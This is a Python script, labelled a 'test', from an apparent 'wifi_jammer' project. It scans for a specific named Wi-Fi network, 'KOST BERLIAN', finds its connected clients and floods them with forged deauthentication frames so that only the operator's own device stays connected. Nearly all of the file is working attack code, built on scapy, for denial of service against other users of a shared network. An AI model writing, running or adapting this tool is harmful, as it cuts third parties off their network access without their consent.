#!/usr/bin/env python3
"""
Test script to deauth attack "KOST BERLIAN" network and keep only your device connected.
"""

import sys
import os
import time
import subprocess
import re
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeElapsedColumn
from rich.prompt import Confirm, Prompt

# Check if we're using venv Python, if not, try to use it
_script_dir = os.path.dirname(os.path.abspath(__file__))
_venv_python = os.path.join(_script_dir, 'venv', 'bin', 'python3')
if not (hasattr(sys, 'real_prefix') or (hasattr(sys, 'base_prefix') and sys.base_prefix != sys.prefix)):
    if os.path.exists(_venv_python):
        print("⚠️  Not using virtual environment. For best results, use:")
        print(f"   {_venv_python} {__file__}")
        print("   Or activate venv first: source venv/bin/activate")
        print()

# Add parent directory to path
sys.path.insert(0, _script_dir)

from wifi_jammer.scanner import ScapyNetworkScanner
from wifi_jammer.utils.logger import RichLogger
from wifi_jammer.core.platform_interface import PlatformInterfaceFactory
from scapy.all import sendp, RadioTap
from scapy.layers.dot11 import Dot11, Dot11Deauth


def get_my_mac(interface: str) -> str:
    """Get the MAC address of the specified interface."""
    try:
        result = subprocess.run(['ifconfig', interface], capture_output=True, text=True, timeout=5)
        mac_match = re.search(r'ether\s+([0-9a-fA-F:]+)', result.stdout)
        if mac_match:
            return mac_match.group(1).lower()
    except Exception as e:
        print(f"Error getting MAC address: {e}")
    return None


def find_network(scanner: ScapyNetworkScanner, interface: str, target_ssid: str):
    """Find the target network."""
    console = Console()
    console.print(f"[cyan]Scanning for network: {target_ssid}[/cyan]")
    
    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        console=console
    ) as progress:
        task = progress.add_task("Scanning networks...", total=None)
        networks = scanner.scan_networks(interface)
        progress.update(task, completed=True)
    
    # Find target network (case-insensitive match)
    target_network = None
    for network in networks:
        if network.ssid and target_ssid.lower() in network.ssid.lower():
            target_network = network
            break
    
    # If not found, try exact match
    if not target_network:
        for network in networks:
            if network.ssid and network.ssid.lower() == target_ssid.lower():
                target_network = network
                break
    
    # If still not found, try direct airport scan as fallback
    if not target_network:
        console.print("[yellow]Network not found in scan, trying direct airport scan...[/yellow]")
        airport_path = "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport"
        if os.path.exists(airport_path):
            import subprocess
            result = subprocess.run([airport_path, '-s'], capture_output=True, text=True, timeout=10)
            if result.returncode == 0 and result.stdout.strip() and "WARNING" not in result.stdout:
                import re
                for line in result.stdout.split('\n'):
                    if target_ssid.lower() in line.lower() and not "WARNING" in line:
                        # Extract BSSID, RSSI, Channel from line
                        bssid_match = re.search(r'([0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2})', line)
                        if bssid_match:
                            bssid = bssid_match.group(1)
                            # Extract RSSI and channel
                            ch_rssi_match = re.search(r'\s+(-?\d+)\s+(\d+)', line)
                            rssi = int(ch_rssi_match.group(1)) if ch_rssi_match else -50
                            channel = int(ch_rssi_match.group(2)) if ch_rssi_match else 0
                            
                            # Extract SSID (everything before BSSID)
                            ssid_match = re.match(r'^(.+?)\s+' + re.escape(bssid), line)
                            ssid = ssid_match.group(1).strip() if ssid_match else target_ssid
                            
                            from wifi_jammer.core.interfaces import NetworkInfo
                            target_network = NetworkInfo(
                                ssid=ssid,
                                bssid=bssid,
                                channel=channel,
                                rssi=rssi,
                                encryption="WPA2",
                                clients=[]
                            )
                            console.print(f"[green]Found network via airport scan![/green]")
                            break
    
    if not target_network:
        console.print(f"[red]Network '{target_ssid}' not found![/red]")
        console.print("\n[yellow]Available networks:[/yellow]")
        table = Table()
        table.add_column("SSID", style="cyan")
        table.add_column("BSSID", style="yellow")
        table.add_column("Channel", style="green")
        table.add_column("RSSI", style="red")
        
        for net in networks[:10]:  # Show first 10
            table.add_row(
                net.ssid or "Hidden",
                net.bssid,
                str(net.channel),
                f"{net.rssi} dBm"
            )
        console.print(table)
        
        # Offer manual entry option
        console.print("\n[yellow]Note:[/yellow] macOS privacy settings may be blocking network information.")
        console.print("[yellow]You can either:[/yellow]")
        console.print("  1. Grant Location Services access to Terminal in System Settings")
        console.print("  2. Enter network details manually")
        
        if Confirm.ask("\n[bold cyan]Enter network details manually?[/bold cyan]", default=True):
            console.print("\n[cyan]Enter network information:[/cyan]")
            bssid = Prompt.ask("BSSID", default="10:8f:fe:00:a3:e0")
            channel_str = Prompt.ask("Channel", default="149")
            try:
                channel = int(channel_str)
            except ValueError:
                channel = 149
                console.print("[yellow]Invalid channel, using 149[/yellow]")
            
            from wifi_jammer.core.interfaces import NetworkInfo
            target_network = NetworkInfo(
                ssid=target_ssid,
                bssid=bssid,
                channel=channel,
                rssi=-77,  # Default RSSI
                encryption="WPA2",
                clients=[]
            )
            console.print(f"[green]Using manually entered network: {target_network.ssid} ({target_network.bssid})[/green]")
            return target_network
        
        return None
    
    console.print(f"[green]Found network: {target_network.ssid} ({target_network.bssid})[/green]")
    console.print(f"  Channel: {target_network.channel}, RSSI: {target_network.rssi} dBm")
    
    return target_network


def discover_clients(scanner: ScapyNetworkScanner, interface: str, ap_bssid: str, channel: int, duration: int = 30):
    """Discover clients on the network."""
    console = Console()
    console.print(f"\n[cyan]Discovering clients on {ap_bssid}...[/cyan]")
    console.print("[yellow]Tip: Generate traffic on other devices to discover them faster[/yellow]")
    
    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        TimeElapsedColumn(),
        console=console
    ) as progress:
        task = progress.add_task(f"Scanning for {duration}s...", total=duration)
        
        def update_progress():
            for _ in range(duration):
                time.sleep(1)
                progress.update(task, advance=1)
        
        import threading
        progress_thread = threading.Thread(target=update_progress)
        progress_thread.start()
        
        clients = scanner.scan_clients(interface, ap_bssid, channel, duration)
        progress_thread.join()
    
    return clients


def kick_clients_except_me(interface: str, ap_bssid: str, clients: dict, my_mac: str, duration: int = 300):
    """Kick all clients except the user's device."""
    console = Console()
    
    # Filter out user's MAC
    target_clients = [mac for mac in clients.keys() if mac.lower() != my_mac.lower()]
    
    if not target_clients:
        console.print("[yellow]No other clients found to kick![/yellow]")
        return
    
    console.print(f"\n[red]Kicking {len(target_clients)} clients (keeping {my_mac} connected)...[/red]")
    console.print(f"[yellow]Duration: {duration} seconds (Press Ctrl+C to stop)[/yellow]")
    
    # Show clients being kicked
    table = Table(title="Clients Being Kicked")
    table.add_column("#", style="cyan")
    table.add_column("MAC Address", style="yellow")
    
    for i, mac in enumerate(target_clients, 1):
        table.add_row(str(i), mac)
    
    console.print(table)
    
    if not Confirm.ask("\n[bold red]Proceed with attack?[/bold red]", default=True):
        console.print("[yellow]Attack cancelled[/yellow]")
        return
    
    start_time = time.time()
    count = 0
    
    try:
        while time.time() - start_time < duration:
            for target_mac in target_clients:
                # Bidirectional deauth for better effect
                # Packet 1: AP -> Client (telling client to disconnect)
                pkt_to_client = (
                    RadioTap() /
                    Dot11(addr1=target_mac, addr2=ap_bssid, addr3=ap_bssid) /
                    Dot11Deauth(reason=7)
                )
                
                # Packet 2: Client -> AP (telling AP client is disconnecting)
                pkt_to_ap = (
                    RadioTap() /
                    Dot11(addr1=ap_bssid, addr2=target_mac, addr3=ap_bssid) /
                    Dot11Deauth(reason=7)
                )
                
                try:
                    sendp(pkt_to_client, iface=interface, verbose=False)
                    sendp(pkt_to_ap, iface=interface, verbose=False)
                    count += 2
                except Exception as e:
                    console.print(f"[red]Error sending packet: {e}[/red]")
            
            # Update status every 50 packets
            if count % 50 == 0:
                elapsed = time.time() - start_time
                remaining = duration - elapsed
                console.print(
                    f"[green]Sent {count:,} packets to {len(target_clients)} clients | "
                    f"Elapsed: {elapsed:.1f}s | Remaining: {remaining:.1f}s[/green]",
                    end='\r'
                )
            
            time.sleep(0.1)  # 10 packets per second per client
            
    except KeyboardInterrupt:
        console.print("\n[yellow]Attack stopped by user[/yellow]")
    
    elapsed = time.time() - start_time
    console.print(f"\n[green]Attack complete![/green]")
    console.print(f"  Total packets sent: {count:,}")
    console.print(f"  Duration: {elapsed:.1f} seconds")
    console.print(f"  Average rate: {count/elapsed:.1f} packets/second")


def main():
    """Main function."""
    console = Console()
    
    # Check root
    if os.geteuid() != 0:
        console.print("[red]This script requires root privileges![/red]")
        console.print("[yellow]Please run with: sudo python3 test_kost_berlian.py[/yellow]")
        sys.exit(1)
    
    # Show banner
    banner = Panel(
        "[bold cyan]KOST BERLIAN Deauth Test[/bold cyan]\n"
        "This script will:\n"
        "1. Scan for 'KOST BERLIAN' network\n"
        "2. Discover all connected clients\n"
        "3. Kick all clients except your device\n"
        "4. Keep only you connected",
        style="cyan"
    )
    console.print(banner)
    
    # Get interface
    platform_interface = PlatformInterfaceFactory.create()
    wireless_interfaces = platform_interface.get_wireless_interfaces()
    
    if not wireless_interfaces:
        console.print("[red]No wireless interfaces found![/red]")
        sys.exit(1)
    
    # Select interface
    if len(wireless_interfaces) == 1:
        interface = wireless_interfaces[0].name
        console.print(f"[green]Using interface: {interface}[/green]")
    else:
        console.print("\n[cyan]Available interfaces:[/cyan]")
        for i, iface in enumerate(wireless_interfaces, 1):
            console.print(f"  {i}. {iface.name} ({iface.status})")
        
        while True:
            try:
                choice = input("\nSelect interface number: ").strip()
                idx = int(choice) - 1
                if 0 <= idx < len(wireless_interfaces):
                    interface = wireless_interfaces[idx].name
                    break
                else:
                    console.print("[red]Invalid selection![/red]")
            except (ValueError, KeyboardInterrupt):
                console.print("[red]Invalid input![/red]")
                sys.exit(1)
    
    # Get user's MAC
    my_mac = get_my_mac(interface)
    if not my_mac:
        console.print("[red]Could not determine your MAC address![/red]")
        sys.exit(1)
    
    console.print(f"[green]Your MAC address: {my_mac}[/green]")
    
    # Initialize scanner
    logger = RichLogger()
    scanner = ScapyNetworkScanner(logger)
    
    # Step 1: Find network
    target_network = find_network(scanner, interface, "KOST BERLIAN")
    if not target_network:
        sys.exit(1)
    
    # Step 2: Discover clients
    console.print("\n[cyan]Step 2: Discovering clients...[/cyan]")
    duration = 30
    if Confirm.ask(f"Scan for {duration} seconds?", default=True):
        clients = discover_clients(scanner, interface, target_network.bssid, target_network.channel, duration)
    else:
        custom_duration = input("Enter scan duration (seconds, default 30): ").strip()
        try:
            duration = int(custom_duration) if custom_duration else 30
        except ValueError:
            duration = 30
        clients = discover_clients(scanner, interface, target_network.bssid, target_network.channel, duration)
    
    # Show discovered clients
    if clients:
        console.print(f"\n[green]Discovered {len(clients)} clients:[/green]")
        table = Table()
        table.add_column("#", style="cyan")
        table.add_column("MAC Address", style="yellow")
        table.add_column("Status", style="green")
        
        for i, (mac, last_seen) in enumerate(clients.items(), 1):
            status = "You" if mac.lower() == my_mac.lower() else "Target"
            table.add_row(str(i), mac, status)
        
        console.print(table)
    else:
        console.print("[yellow]No clients discovered![/yellow]")
        if not Confirm.ask("Continue anyway?", default=False):
            sys.exit(0)
    
    # Step 3: Kick clients
    console.print("\n[cyan]Step 3: Starting deauth attack...[/cyan]")
    attack_duration = 300  # 5 minutes default
    if Confirm.ask(f"Run attack for {attack_duration} seconds (5 minutes)?", default=True):
        pass
    else:
        custom_duration = input("Enter attack duration (seconds, default 300): ").strip()
        try:
            attack_duration = int(custom_duration) if custom_duration else 300
        except ValueError:
            attack_duration = 300
    
    kick_clients_except_me(interface, target_network.bssid, clients, my_mac, attack_duration)
    
    console.print("\n[green]Test completed![/green]")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        console = Console()
        console.print("\n[yellow]Interrupted by user[/yellow]")
        sys.exit(0)
    except Exception as e:
        console = Console()
        console.print(f"\n[red]Error: {e}[/red]")
        import traceback
        traceback.print_exc()
        sys.exit(1)

